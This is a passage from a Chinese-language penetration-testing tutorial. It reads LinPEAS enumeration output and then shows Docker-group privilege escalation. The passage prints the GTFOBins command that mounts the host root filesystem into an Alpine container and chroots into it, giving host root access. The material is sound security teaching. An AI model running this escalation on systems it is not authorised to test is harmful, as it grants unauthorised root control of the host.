<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="25工具枚举-docker--linpeas"><strong><div id="id2.5">2.5、工具枚举 Docker – LinPEAS</div></strong><a href="#25工具枚举-docker--linpeas" class="hash-link" aria-label="25工具枚举-docker--linpeas的直接链接" title="25工具枚举-docker--linpeas的直接链接">​</a></h4>
<p>LinPEAS 是一款终极的后渗透枚举工具，本文中关于它在受害者机器上进行的传输、执行等过程不再累述，我们只关注在脚本执行结束之后关于输出结果的梳理，看看 LinPEAS 枚举效果如何。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174927000-1745769283-d69cc3297c2a88b31d2d6beed7c32e6b.png" width="658" height="83" class="img_ev3q"></p>
<p>LinPEAS 首先要做的检查之一是 &quot;Basic Information&quot;，它基本上是通过几个简单的命令来提供高级信息。</p>
<p>这里运行的简单命令之一是 <strong>id</strong>，它立即向我们显示当前用户位于 docker 组中。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174928969-1803794702-502b05094e627d2c82f3e9245187a01f.png" width="1024" height="219" class="img_ev3q"></p>
<p>接着，我们来到 “Processes, Crons, Timers, Services and Sockets” 部分，在这里我们可以看到 dockerd 进程由 root 拥有。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174928335-1386491542-3dd89bf998bd395f36aa99e5d1ce0ed9.png" width="1024" height="118" class="img_ev3q"></p>
<p>令人惊讶的是，这甚至不是一个红色发现，这意味着如果我们不知道寻找它，它很容易会被忽视。</p>
<p>在同一部分中进一步向下滚动。我们将会遇到 Unix Sockets。在这里我们会发现 <strong>docker.sock</strong> 文件是可写的。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174927745-226886281-df4baa14dbe2fcd500f2cdcf8c5b53f0.png" width="617" height="516" class="img_ev3q"></p>
<blockquote>
<p>过去，可写的 docker.sock 结果总是红色/黄色。但在最新版本的 LinPEAS 中（本文撰写时），这只是一个红色结果。</p>
</blockquote>
<p>下一部分我们将在 “User Information” 部分找到有关 docker 的信息。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174927374-2038623795-872e2ba6917a71ced81cd7d895368db9.png" width="687" height="116" class="img_ev3q"></p>
<p>在这里，我们可以看到针对当前用户再次发出的 id 命令。再往下一点，我们还可以看到 docker 组中的所有用户。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174927687-2112510991-73171b4c68cadd90740b99c60ec330a1.png" width="1024" height="172" class="img_ev3q"></p>
<p>最后，当我们继续向下滚动时，我们将看到 “docker files”，但在这个例子中它们都不是重点。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174928933-1108348464-465c6932eb6e0a7f2a6eb552d5f63563.png" width="1024" height="123" class="img_ev3q"></p>
<p>以上结果表明，LinPEAS 能够像手动操作一样枚举 docker 服务。</p>
<p><strong>请记住，LinPEAS 并不会尝试枚举容器镜像，也不会检查容器是否以 root 作为默认用户运行。</strong></p>
<p>现在，我们已经了解了如何枚举 docker 服务、镜像和默认用户，接下来让我们看看如何利用我们发现的内容继续利用该服务。</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="3场景1通过滥用-docker-组权限提权"><strong><div id="id3">3、场景1：通过滥用 Docker 组权限提权</div></strong><a href="#3场景1通过滥用-docker-组权限提权" class="hash-link" aria-label="3场景1通过滥用-docker-组权限提权的直接链接" title="3场景1通过滥用-docker-组权限提权的直接链接">​</a></h2>
<p>之前我们了解了如何枚举容器中的默认用户，而默认用户恰好是 root。进行枚举时，我们使用 docker run 命令启动容器来执行单条命令。</p>
<p>与我们启动容器来运行单条命令类似，我们也可以启动容器并进入 shell 中，以与其进行命令交互。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">docker run --rm -it alpine sh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174927708-425432448-2593c5b41be1f29d614cfdb993379f45.png" width="589" height="368" class="img_ev3q"></p>
<p>这一次，我们进入了一个带有文件系统的容器，不过请注意，在这个文件系统中的 root 与在宿主机上的 root 是并不相同的。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="31在-gtfobins-上查找-docker-利用"><strong><div id="id3.1">3.1、在 GTFOBins 上查找 Docker 利用</div></strong><a href="#31在-gtfobins-上查找-docker-利用" class="hash-link" aria-label="31在-gtfobins-上查找-docker-利用的直接链接" title="31在-gtfobins-上查找-docker-利用的直接链接">​</a></h4>
<p>那么我们如何才能从容器中的 root 转到实际主机上的 root 呢？ 答案就在于 <strong>docker run</strong> 命令以及我们如何启动容器。</p>
<p>由于漏洞利用依赖于 <strong>docker</strong> 命令，因此我们可以检查 <a href="https://gtfobins.github.io/gtfobins/docker/" target="_blank" rel="noopener noreferrer" title="GTFOBins">GTFOBins</a> 以查找漏洞利用。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174927740-805636924-d02674246b3b665b386061b5e502b689.png" width="804" height="176" class="img_ev3q"></p>
<p>我们知道当前的用户正好位于 docker 组中，而这也正好符合上面 docker 命令的使用条件，这也就意味着我们可以利用它并获得 root 权限！</p>
<p>GTFOBins 给出的利用命令有很多选择，但 “shell” 绝对是最有趣的。</p>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,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" width="825" height="181" class="img_ev3q"></p>
<p>这告诉我们，我们可以摆脱受限环境并获得 root shell，这太完美了！</p>
<p>上面的命令会将宿主机文件系统挂载到容器内的 /mnt 目录，然后将我们放入 /mnt 中的 shell 中。本质上，我们将成为容器内的 root，但实际上会与宿主机的文件系统进行交互。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="32在-docker-容器中挂载宿主机文件系统"><strong><div id="id3.2">3.2、在 Docker 容器中挂载宿主机文件系统</div></strong><a href="#32在-docker-容器中挂载宿主机文件系统" class="hash-link" aria-label="32在-docker-容器中挂载宿主机文件系统的直接链接" title="32在-docker-容器中挂载宿主机文件系统的直接链接">​</a></h4>
<p>由于目标主机上的镜像文件也是 alpine，因此我们可以使用 GTFOBins 中的命令，而无需对其进行编辑。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">docker run -v /:/mnt --rm -it alpine chroot /mnt sh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174927723-489201810-e2306cc72600c0e9218b7350ecd69049.png" width="568" height="131" class="img_ev3q"></p>
<p>现在，当我们执行 <strong>ls</strong> 命令时，我们看到列出了更多的目录。这是因为我们看到的是宿主机文件系统上的目录！</p>
